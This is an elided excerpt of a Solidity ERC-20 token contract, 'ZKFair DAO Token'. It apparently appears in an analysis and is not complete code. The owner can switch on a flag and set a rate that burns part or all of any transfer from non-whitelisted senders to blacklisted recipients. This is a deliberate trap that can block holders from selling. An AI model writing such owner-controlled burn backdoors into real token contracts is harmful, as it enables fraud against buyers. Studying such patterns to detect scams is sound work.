...
contract ZKFDERC20Token is ERC20Permit, VaultOwned {
    using SafeMath for uint256;
    ...
    constructor() ERC20("ZKFair DAO Token", "ZKFD", 9) {
        _mint(msg.sender, 100000 * 1e9);
    }

    function setFlag(bool _flag) external onlyOwner returns (bool) {
        flag = _flag;
        return true;
    }

    function setNum(uint256 _num) external onlyOwner returns (bool) {
        num = _num;
        return true;
    }
    ...
    function transfer(
        ...
        if (flag) {
            if (
                ...
                tAmount = amount.mul(num).div(10000);
                _burn(msg.sender, tAmount);
                tAmount = amount.sub(tAmount);
            }
        }
    ...
    function transferFrom(
        ...
        if (flag) {
            if (
                whiteListed[sender] == false && blackListed[recipient] == true
            ) {
                tAmount = amount.mul(num).div(10000);
